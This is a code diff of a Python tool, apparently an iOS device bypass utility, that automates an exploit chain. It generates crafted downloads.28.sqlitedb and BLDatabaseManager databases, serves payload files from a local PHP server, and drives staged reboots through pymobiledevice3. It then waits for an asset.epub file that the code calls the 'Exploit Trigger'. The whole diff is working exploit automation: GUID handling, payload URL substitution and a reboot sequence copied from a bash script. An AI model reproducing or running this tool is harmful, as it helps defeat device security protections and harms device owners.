@@ -1,3 +1,4 @@
+
 import sys
 import os
 import time
@@ -12,8 +13,34 @@ import zipfile
 import tempfile
 import binascii
 import plistlib
+import argparse
 from http.server import SimpleHTTPRequestHandler
 from socketserver import TCPServer
+
+# --- ENV LOADING ---
+def load_env_guid():
+    env_path = os.path.join(os.path.dirname(__file__), ".env")
+    if os.path.exists(env_path):
+        with open(env_path) as f:
+            for line in f:
+                line = line.strip()
+                if line.startswith("HARDCODED_GUID="):
+                    # Support possible quotes and whitespace
+                    val = line.split("=",1)[1].strip().strip('"').strip("'")
+                    if val:
+                        return val
+    return None
+
+
+def is_valid_guid(guid: str) -> bool:
+    """Validate GUID of form 8-4-4-4-12 hex chars (case-insensitive)."""
+    if not guid or not isinstance(guid, str):
+        return False
+    pattern = r"^[A-Fa-f0-9]{8}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{12}$"
+    return re.match(pattern, guid) is not None
+
+# --- HARDCODED GUID (from .env only; no built-in fallback) ---
+HARDCODED_GUID = load_env_guid()
 
 # --- CONFIGURATION & CONSTANTS ---
 
@@ -254,7 +281,8 @@ class PayloadGenerator:
                 bl_sql_content = f.read()
             
             # Replace placeholder with URL
-            bl_sql_content = bl_sql_content.replace('KEYOOOOOO', fixedfile_url)
+            # NOTE: The SQL template uses 'URL_GESTALT' as a placeholder for the fixedfile URL.
+            bl_sql_content = bl_sql_content.replace('URL_GESTALT', fixedfile_url)
             
             print(f"{Style.DIM}  ╰─▶ Generating BLDatabaseManager from SQL...{Style.RESET}")
             if not self._create_db_from_sql(bl_sql_content, bl_db_path):
@@ -312,17 +340,16 @@ class PayloadGenerator:
             server_base = f"http://{local_server.local_ip}:{local_server.port}"
             
             # Replace URL placeholders with our server URLs
-            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=sqlite', bl_url)
-            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=blshm', shm_url)
-            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=blwal', wal_url)
-            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=itunes', meta_url)
-            
-            # Legacy fallbacks (keep for compatibility)
-            dl_sql_content = dl_sql_content.replace('URL_METADATA', meta_url)
-            dl_sql_content = dl_sql_content.replace('URL_WAL', wal_url)
-            dl_sql_content = dl_sql_content.replace('URL_SHM', shm_url)
             dl_sql_content = dl_sql_content.replace('URL_DB', bl_url)
-            dl_sql_content = dl_sql_content.replace('https://google.com', bl_url)
+            dl_sql_content = dl_sql_content.replace('URL_SHM', shm_url)
+            dl_sql_content = dl_sql_content.replace('URL_WAL', wal_url)
+            dl_sql_content = dl_sql_content.replace('URL_METADATA', meta_url)
+            
+            # Replace hardcoded GUID from template if present
+            dl_sql_content = dl_sql_content.replace('3DBBBC39-F5BA-4333-B40C-6996DE48F91C', guid)
+
+            # Legacy fallbacks (keep for compatibility with older templates)
+            # dl_sql_content = dl_sql_content.replace('https://google.com', bl_url) # Legacy placeholder
             dl_sql_content = dl_sql_content.replace('GOODKEY', guid)
             
             print(f"{Style.DIM}  ╰─▶ Generating downloads.28.sqlitedb from SQL...{Style.RESET}")
@@ -759,8 +786,30 @@ class BypassAutomation:
         print(f"{Style.YELLOW}Starting in 5 seconds...{Style.RESET}")
         time.sleep(5)
         
-        # --- Extract GUID from device ---
-        self.guid = self.get_guid()
+        # --- Get GUID (interactive menu) ---
+        print(f"\n{Style.BOLD}GUID Selection:{Style.RESET}")
+        print(f"  1. Extract GUID from device (requires syslog)")
+        if HARDCODED_GUID and is_valid_guid(HARDCODED_GUID):
+            print(f"  2. Use hardcoded GUID: {Style.CYAN}{HARDCODED_GUID}{Style.RESET}")
+        else:
+            print(f"  2. Use hardcoded GUID: {Style.YELLOW}Not configured or invalid in .env{Style.RESET}")
+        
+        while True:
+            prompt = f"\n{Style.BOLD}Enter choice (1 or 2): {Style.RESET}"
+            choice = input(prompt).strip()
+            if choice == "1":
+                self.guid = self.get_guid()
+                break
+            elif choice == "2":
+                if HARDCODED_GUID and is_valid_guid(HARDCODED_GUID):
+                    self.guid = HARDCODED_GUID
+                    self.log(f"Using hardcoded GUID: {self.guid}", "info")
+                    break
+                else:
+                    self.log("HARDCODED_GUID is not configured in .env or is invalid. Please set it or choose option 1.", "error")
+                    continue
+            else:
+                print(f"{Style.RED}Invalid choice. Please enter 1 or 2.{Style.RESET}")
 
         if not self.guid:
             self.log("Could not find GUID in logs.", "error")
@@ -818,88 +867,60 @@ class BypassAutomation:
         self.log("Verifying filesystem sync before reboot...", "info")
         self.wait_for_device_services_ready(timeout=30, poll_interval=2)
 
-        self.log("Rebooting (Stage 1/2)...", "step")
-        if not self.reboot_device_and_wait(timeout=120):
-            self.log("Failed to reconnect after Stage 1/2 reboot", "error")
-            sys.exit(1)
-
-        # Wait for system stabilization by polling services ready
-        self.log("Waiting for system stabilization...", "info")
-        self.wait_for_device_services_ready(timeout=60, poll_interval=2)
-
-        # --- Prompt user to open Books app manually ---
-        print(f"\n{Style.BOLD}{Style.YELLOW}*** MANUAL ACTION REQUIRED ***{Style.RESET}")
-        print(f"{Style.YELLOW}Please open the Books app on your device NOW!{Style.RESET}")
-        print(f"{Style.YELLOW}Then press Enter to continue...{Style.RESET}")
-        input()
-
-        # --- ADDED: Plist Transfer (Strawhat Logic) ---
-        self.transfer_plist_to_books()
-
-        # --- 6. Reboot Sequence (Matching A12 2.sh) ---
-        
-        # Reboot 1 (Already done above as "Stage 1/2" in previous code, but let's align with bash script)
+        # --- 6. Reboot Sequence (Matching A12 2.sh EXACTLY) ---
         # The bash script does:
         # 1. Upload DB
-        # 2. Reboot (First Reboot)
-        # 3. Wait for iTunesMetadata.plist
-        # 4. Reboot (Second Reboot)
-        # 5. Wait for asset.epub
+        # 2. First Reboot
+        # 3. Wait for iTunesMetadata.plist to appear
+        # 4. Second Reboot
+        # 5. Wait for asset.epub (triggered automatically by system, NOT by opening Books!)
         # 6. Wait for iTunesMetadata.plist to disappear
         # 7. Cleanup
-        # 8. Reboot (Final Reboot)
+        # 8. Final Reboot
         
-        # We just finished Reboot 1 (Stage 1/2 in old code).
-        # Now we verify iTunesMetadata.plist
-        
+        # First Reboot
+        self.log("Rebooting (First Reboot)...", "step")
+        if not self.reboot_device_and_wait(timeout=120):
+            self.log("Failed to reconnect after First Reboot", "error")
+            sys.exit(1)
+
+        # Wait for system stabilization
+        self.log("Waiting for system stabilization...", "info")
+        self.wait_for_device_services_ready(timeout=60, poll_interval=2)
+        time.sleep(30)  # Match bash script's sleep 30 after reconnect
+
+        # Verify iTunesMetadata.plist appears (itunesstored processing downloads.28)
         self.log("Verifying iTunesMetadata.plist...", "step")
-        metadata_path = "/iTunes_Control/iTunes/iTunesMetadata.plist"
-        found_metadata = False
-        
-        # Wait up to 20s using polling
         found_metadata = self.wait_for_file_on_device("/iTunes_Control/iTunes/iTunesMetadata.plist", timeout=20, poll_interval=1)
             
         if not found_metadata:
-            self.log("iTunesMetadata.plist not found (continuing anyway...)", "warn")
-
-        # Reboot 2
-        self.log("Rebooting (Stage 2/3)...", "step")
-        if not self.reboot_device_and_wait(timeout=120):
-            self.log("Failed to reconnect after Stage 2/3 reboot", "error")
+            self.log("iTunesMetadata.plist not found after first reboot!", "error")
+            self.log("This means itunesstored didn't process downloads.28.sqlitedb", "error")
             sys.exit(1)
-
-        # Wait for bookassetd to process BLDatabaseManager using polling
-        self.log("Waiting for bookassetd to process BLDatabaseManager...", "info")
         
-        # Launch iBooks to trigger bookassetd to read BLDatabaseManager
-        self.log("Launching iBooks to trigger bookassetd...", "info")
-        try:
-            self._run_cmd(["pymobiledevice3", "apps", "launch", "com.apple.iBooks"])
-        except:
-            try:
-                self._run_cmd(["pymobiledevice3", "processes", "launch", "com.apple.iBooks"])
-            except:
-                self.log("Could not launch iBooks automatically", "warn")
-        
-        # Poll for epub request in server log instead of hard 60s wait
-        start_time = time.time()
-        max_wait = 60
-        while time.time() - start_time < max_wait:
-            try:
-                with open("php_server.log", "r") as f:
-                    content = f.read()
-                    if "payload_" in content and ".epub" in content:
-                        self.log("Server received epub request!", "success")
-                        break
-            except:
-                pass
-            time.sleep(2)
+        self.log("iTunesMetadata.plist found - itunesstored processed the download!", "success")
 
-        # Monitor asset.epub (Exploit Trigger)
-        self.log("Waiting for asset.epub (Exploit Trigger)...", "step")
+        # Second Reboot (this triggers bookassetd to process BLDatabaseManager)
+        self.log("Rebooting (Second Reboot)...", "step")
+        if not self.reboot_device_and_wait(timeout=120):
+            self.log("Failed to reconnect after Second Reboot", "error")
+            sys.exit(1)
+        
+        # Wait for system stabilization
+        self.log("Waiting for system stabilization...", "info")
+        self.wait_for_device_services_ready(timeout=60, poll_interval=2)
+        time.sleep(30)  # Match bash script
+
+        # NOTE: We do NOT open Books app! The system triggers bookassetd automatically
+        # after the reboot when itunesstored/bookassetd process the chain:
+        # downloads.28 -> BLDatabaseManager -> asset.epub
+
+        # Monitor asset.epub (Exploit Trigger) - NO BOOKS APP LAUNCH NEEDED
+        self.log("Waiting for asset.epub (max 300s)...", "step")
+        self.log("System will automatically trigger bookassetd - no manual action needed", "info")
         found_asset = False
         
-        # Wait up to 300s
+        # Wait up to 300s (matching A12 2.sh MAX_ASSET_WAIT_TIME)
         for i in range(60): # Check every 5s for 300s
             # Check /Books/asset.epub
             code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Books"])
@@ -908,12 +929,15 @@ class BypassAutomation:
                  found_asset = True
                  break
             
-            # Debug: Show what IS there
-            if i % 4 == 0: # Every 20s
+            # Debug: Show progress every 20s
+            if i % 4 == 0 and i > 0:
+                elapsed = i * 5
+                self.log(f"Still waiting... ({elapsed}s/300s)", "info")
+                
                 # Check /Books
                 code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Books"])
                 files = [f for f in out.splitlines() if f not in ['.', '..', '']]
-                print(f"\n{Style.DIM}      [DEBUG] /Books: {files}{Style.RESET}")
+                print(f"{Style.DIM}      [DEBUG] /Books: {files}{Style.RESET}")
 
                 # Check /Downloads (To see if temp files are stuck there)
                 code_dl, out_dl, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Downloads"])
@@ -925,7 +949,6 @@ class BypassAutomation:
                 if self.server.process.poll() is not None:
                     print(f"\n{Style.RED}[!] PHP Server has crashed! Exit code: {self.server.process.returncode}{Style.RESET}")
                     print(f"{Style.RED}[!] Check php_server.log for details.{Style.RESET}")
-                    # Attempt restart?
                     print(f"{Style.YELLOW}[*] Attempting to restart server...{Style.RESET}")
                     self.server.start()
                 
